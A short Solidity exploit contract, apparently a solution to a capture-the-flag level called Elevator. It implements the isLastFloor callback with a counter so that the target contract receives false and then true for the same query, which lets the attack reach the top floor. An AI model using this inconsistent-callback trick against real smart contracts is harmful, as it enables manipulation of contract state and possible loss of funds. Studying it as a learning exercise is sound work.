pragma solidity ^0.8.10;

interface IElevator {
    function goTo(uint256) external;
}

contract ElevatorHack {
    bool public top;
    uint256 public floor;
    uint256 public counter;
    IElevator elevator;
    
    constructor(address challengeAddress) {
        elevator = IElevator(challengeAddress);
    }

    function attack() external payable {
        elevator.goTo(0);
    }

    function isLastFloor(uint256 _floor) external returns(bool) {
        counter++;
        if (counter > 1) {
            return true;
        }
        return false;
    }
}
